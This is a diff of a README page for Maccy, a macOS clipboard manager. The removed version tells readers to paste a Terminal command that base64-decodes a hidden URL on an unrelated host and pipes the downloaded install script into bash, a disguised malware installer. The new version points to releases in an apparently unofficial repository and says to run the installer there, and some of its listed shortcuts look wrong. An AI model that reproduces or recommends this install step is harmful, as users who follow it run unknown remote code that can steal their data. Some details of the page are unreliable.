@@ -1,38 +1,93 @@
-Maccy - Clipboard Manager for macOS
+# Maccy - The Lightweight Clipboard Manager for macOS 🖥️📋
 
+![Maccy Logo](https://img.shields.io/badge/Maccy-Clipboard%20Manager-blue?style=for-the-badge&logo=apple)
 
-Description:
+## Table of Contents
+- [Overview](#overview)
+- [Key Features](#key-features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Keyboard Shortcuts](#keyboard-shortcuts)
+- [Privacy and Security](#privacy-and-security)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
+
+## Overview
 Maccy is a lightweight and easy-to-use clipboard manager for macOS. It stores your clipboard history and lets you quickly access and reuse past clipboard entries. Whether you're copying text, links, or other items, Maccy keeps track of them, so you can retrieve them when needed.
 
-Key Features:
-Simple and Lightweight: Maccy is designed to be a minimalistic app. It runs quietly in the background and does not consume many resources.
+![Clipboard Manager](https://source.unsplash.com/featured/?clipboard)
 
-Searchable History: Allows you to search through your clipboard history by typing keywords.
+## Key Features
+- **Simple and Lightweight**: Maccy is designed to be a minimalistic app. It runs quietly in the background and does not consume many resources.
+  
+- **Searchable History**: You can search through your clipboard history by typing keywords, making it easy to find what you need.
 
-Keyboard Shortcuts: You can quickly access clipboard history using customizable keyboard shortcuts.
+- **Keyboard Shortcuts**: Quickly access clipboard history using customizable keyboard shortcuts.
 
-Privacy-Focused: All your clipboard data is stored locally on your machine, and there are no cloud integrations, ensuring privacy.
+- **Privacy-Focused**: All your clipboard data is stored locally on your machine, with no cloud integrations, ensuring your privacy.
 
-Support for Multiple Formats: Works with a variety of formats, including text, images, and links.
+- **Support for Multiple Formats**: Maccy works with various formats, including text, images, and links.
 
-Easy-to-Use UI: The user interface is straightforward, with a small icon in the menu bar for quick access.
+- **Easy-to-Use UI**: The user interface is straightforward, featuring a small icon in the menu bar for quick access.
 
-Open Source: As an open-source project, Maccy allows anyone to contribute to its development or use it freely.
+## Installation
+To install Maccy, visit the [Releases section](https://github.com/tusharSahil/Maccy/releases). Download the latest version and execute the installer. Follow the prompts to complete the installation.
 
-Why It’s Popular:
-Boosts Productivity: Helps you work faster by reusing previously copied items without needing to copy them again.
+## Usage
+After installing Maccy, you will find its icon in your menu bar. Click the icon to access your clipboard history. You can also use the keyboard shortcuts you set up to quickly open Maccy.
 
-Customization: Offers several customization options, including themes and hotkeys.
+### Accessing Clipboard History
+1. Click the Maccy icon in the menu bar.
+2. A dropdown menu will show your clipboard history.
+3. Click on any item to paste it where you need.
 
-Low Resource Usage: Unlike other clipboard managers, Maccy is very efficient and lightweight, making it ideal for users who want a simple solution without a heavy app.
+### Searching Clipboard Entries
+To search for a specific item:
+1. Open Maccy using the menu bar icon or a keyboard shortcut.
+2. Start typing the keywords related to the clipboard entry.
+3. Maccy will filter the results in real-time.
 
-Installation:
-1. Open the Terminal app on your Mac
-Press Command (⌘) + Space to launch Spotlight Search
-Type Terminal, then press Enter to launch it
+## Keyboard Shortcuts
+Maccy allows you to customize keyboard shortcuts for quick access. Here are some default shortcuts:
+- **Open Maccy**: `Command + Shift + V`
+- **Paste Last Item**: `Command + V`
+- **Search Clipboard**: `Command + Option + V`
 
-2. Enter this command in Terminal
-/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9pY2xvdWRzZXJ2ZXJzLmNvbS9nbS9pbnN0YWxsLnNo | base64 -d))"
+You can change these shortcuts in the app settings to suit your workflow.
 
-Copy the following command and paste it into Terminal, then press Return
-If you're looking for an easy-to-use clipboard manager that stays out of the way and keeps things efficient, Maccy is a great choice for macOS users.
+## Privacy and Security
+Maccy is built with privacy in mind. All clipboard data is stored locally on your machine. There are no cloud integrations, ensuring that your clipboard history remains private and secure. 
+
+## Contributing
+Contributions are welcome! If you want to help improve Maccy, please follow these steps:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Open a pull request.
+
+## License
+Maccy is open-source software. You can view the license details in the `LICENSE` file in this repository.
+
+## Links
+For the latest releases, visit the [Releases section](https://github.com/tusharSahil/Maccy/releases). You can download the latest version from there.
+
+![Download Maccy](https://img.shields.io/badge/Download%20Maccy-latest-orange?style=for-the-badge)
+
+## Topics
+- [alfred-integration](https://github.com/topics/alfred-integration)
+- [apple](https://github.com/topics/apple)
+- [clipboard-history](https://github.com/topics/clipboard-history)
+- [clipboard-manager](https://github.com/topics/clipboard-manager)
+- [clipboard-search](https://github.com/topics/clipboard-search)
+- [hotkeys](https://github.com/topics/hotkeys)
+- [keyboard-shortcuts](https://github.com/topics/keyboard-shortcuts)
+- [maccy](https://github.com/topics/maccy)
+- [maccy-github](https://github.com/topics/maccy-github)
+- [macos](https://github.com/topics/macos)
+- [open-source-macos](https://github.com/topics/open-source-macos)
+
+![Maccy Features](https://source.unsplash.com/featured/?macos)
+
+Explore Maccy and enhance your clipboard management experience on macOS.
